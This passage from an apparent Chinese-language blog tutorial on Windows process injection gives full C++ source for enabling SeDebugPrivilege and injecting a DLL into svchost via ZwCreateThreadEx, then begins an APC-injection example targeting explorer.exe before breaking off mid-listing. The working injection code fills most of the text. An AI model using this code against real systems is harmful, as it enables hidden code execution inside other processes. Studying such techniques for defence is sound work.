class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ZwCreateThreadEx_Test.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;InjectDll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;AdjustTokenPrivilegesTest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-comment">// 提升当前进程令牌权限</span><br><span class="hljs-built_in">EnbalePrivileges</span>(::<span class="hljs-built_in">GetCurrentProcess</span>(), SE_DEBUG_NAME);<br><span class="hljs-comment">// 远线程注入 DLL</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _WIN64</span><br>BOOL bRet = <span class="hljs-built_in">ZwCreateThreadExInjectDll</span>(<span class="hljs-number">10040</span>,<span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\ZwCreateThreadEx\\x64\\Debug\\Dll1.dll&quot;</span>);  <br><span class="hljs-meta">#<span class="hljs-keyword">else</span> </span><br>    <span class="hljs-comment">//带注入的系统进程pid，以及要注入的dll路径（根据实际要求需修改）64位</span><br>BOOL bRet = <span class="hljs-built_in">ZwCreateThreadExInjectDll</span>(<span class="hljs-number">11584</span>, <span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\ZwCreateThreadEx\\x64\\Debug\\Dll1.dll&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inject Dll Error.\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inject Dll OK.\n&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>AdjustTokenPrivilegesTest.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;AdjustTokenPrivilegesTest.h&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EP_ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="hljs-built_in">GetLastError</span>());<br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK);<br>&#125;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">EnbalePrivileges</span><span class="hljs-params">(HANDLE hProcess, <span class="hljs-type">char</span>* pszPrivilegesName)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>LUID luidValue = &#123; <span class="hljs-number">0</span> &#125;;<br>TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL bRet = FALSE;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-comment">// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄</span><br>bRet = ::<span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;OpenProcessToken&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span><br>bRet = ::<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, pszPrivilegesName, &amp;luidValue);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;LookupPrivilegeValue&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 设置提升权限信息</span><br>tokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = luidValue;<br>tokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-comment">// 提升进程令牌访问权限</span><br>bRet = ::<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivileges, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;AdjustTokenPrivileges&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">// 根据错误码判断是否特权都设置成功</span><br>dwRet = ::<span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">if</span> (ERROR_SUCCESS == dwRet)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet)<br>&#123;<br><span class="hljs-built_in">EP_ShowError</span>(<span class="hljs-string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>InjectDll.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;InjectDll.h&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="hljs-built_in">GetLastError</span>());<br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK);<br>&#125;<br><br><br><span class="hljs-comment">// 使用 ZwCreateThreadEx 实现远线程注入</span><br><span class="hljs-function">BOOL <span class="hljs-title">ZwCreateThreadExInjectDll</span><span class="hljs-params">(DWORD dwProcessId, <span class="hljs-type">char</span>* pszDllFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>SIZE_T dwSize = <span class="hljs-number">0</span>;<br>LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;<br>FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;<br>HANDLE hRemoteThread = <span class="hljs-literal">NULL</span>;<br>DWORD dwStatus = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 打开注入进程，获取进程句柄</span><br>hProcess = ::<span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hProcess)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenProcess&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 在注入进程中申请内存</span><br>dwSize = <span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlen</span>(pszDllFileName);<br>pDllAddr = ::<span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pDllAddr)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;VirtualAllocEx&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 向申请的内存中写入数据</span><br><span class="hljs-keyword">if</span> (FALSE == ::<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="hljs-literal">NULL</span>))<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;WriteProcessMemory&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 加载 ntdll.dll</span><br>HMODULE hNtdllDll = ::<span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hNtdllDll)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;LoadLirbary&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取LoadLibraryA函数地址</span><br>pFuncProcAddr = ::<span class="hljs-built_in">GetProcAddress</span>(::<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;Kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFuncProcAddr)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;GetProcAddress_LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取ZwCreateThread函数地址</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG CreateThreadFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T StackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T MaximumStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID pUnkown)</span></span>;          <span class="hljs-comment">//64位ZwCreateThread函数声明</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">BOOL CreateSuspended,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dw1,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dw2,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID pUnkown)</span></span>;     <span class="hljs-comment">//32位ZwCreateThread函数声明</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::<span class="hljs-built_in">GetProcAddress</span>(hNtdllDll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == ZwCreateThreadEx)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;GetProcAddress_ZwCreateThread&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 使用 ZwCreateThreadEx 创建远线程, 实现 DLL 注入</span><br>dwStatus = <span class="hljs-built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hRemoteThread)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 关闭句柄</span><br>::<span class="hljs-built_in">CloseHandle</span>(hProcess);<br>::<span class="hljs-built_in">FreeLibrary</span>(hNtdllDll);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意：</strong>ZwCreateThread函数声明在32位和64位系统下，函数声明不同；要注入系统64位进程，需要生成64位程序。</p><h4 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h4><p>未运行前，待注入系统进程svchost(pid:11594)没有加载Dll1.dll</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221027091408413.png" alt="image-20221027091408413"></p><p>运行后（管理员权限），成功注入svchost(pid:11594)到中</p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221027091655040.png" alt="image-20221027091655040"></p><h3 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a><strong>APC注入</strong></h3><p>Windows的APC机制    <a href="https://blog.csdn.net/qq_38474570/article/details/104326170">https://blog.csdn.net/qq_38474570/article/details/104326170</a></p><p>APC(Asynchronous Procedure Call)为异步过程调用，是指函数在特定线程中被异步执行。在Windows操作系统中，APC是一种并发机制，用于异步IO或者定时器。每一个线程都有自已的APC队列，使用<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a>函数把一个APC函数压人APC队列中。当处于用户模式的APC压人线程APC队列后，该线程并不直接调用APC函数，除非该线程处于可通知状态，调用的顺序为先入先出(FIFO)。</p><h4 id="实现原理-3"><a href="#实现原理-3" class="headerlink" title="实现原理"></a>实现原理</h4><p>在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自已的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对<br>于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SignalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自已挂起时就是进入可警告状态，此时便会执行APC队列函数。</p><p>一个进程包含多个线程，为了确保能够执行插入的APC，应向目标进程的所有线程都插入相同的APC，实现加载DLL的操作。</p><p> 实现APC注入的具体流程如下:</p><p> 首先，通过OpenProcess函数打开目标进程，获取目标进程的句柄。</p><p> 然后，通过调用WIN32 API函数CreateToolhelp32Snapshot、Thread32First以及Thread32Next遍历线程快照，获取目标进程的所有线程ID。</p><p> 接着，调用VirtualAllocEx函数在目标进程中申请内存，并通过WriteProcessMemory函数向内存中写入DLL的注入路径。</p><p> 最后，遍历获取的线程ID，并调用OpenThread函数以THREAD_ALL_ACCESS访问权限打开线程，获取线程句柄。并调用QueueUserAPC函数向线程插入APC函数，设置APC函数的地址为LoadLibraryA函数的地址,并设置APC函数参数为上述DLL路径地址。</p><h4 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h4><p>ApcInject.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _APC_INJECT_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APC_INJECT_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-comment">// 根据进程名称获取PID</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetProcessIdByProcessName</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszProcessName)</span></span>;<br><span class="hljs-comment">// 根据PID获取所有的相应线程ID</span><br><span class="hljs-function">BOOL <span class="hljs-title">GetAllThreadIdByProcessId</span><span class="hljs-params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* dwThreadIdLength)</span></span>;<br><span class="hljs-comment">// APC注入</span><br><span class="hljs-function">BOOL <span class="hljs-title">ApcInjectDll</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszProcessName, <span class="hljs-type">char</span>* pszDllName)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>QueueUserAPC.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ApcInject.h&quot;</span></span><br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>BOOL bRet = FALSE;<br><br><span class="hljs-comment">// APC注入</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>bRet = <span class="hljs-built_in">ApcInjectDll</span>(<span class="hljs-string">&quot;explorer.exe&quot;</span>, <span class="hljs-string">&quot;C:\\Users\\admin\\Desktop\\C++\\CreateRemoteThread\\x64\\Debug\\Dll1.dll&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>bRet = <span class="hljs-built_in">ApcInjectDll</span>(<span class="hljs-string">&quot;explorer.exe&quot;</span>, <span class="hljs-string">&quot;C:\\C C++\\winhack\\remotedll\\001\\001.dll&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;APC Inject OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;APC Inject ERROR.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ApcInject.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span 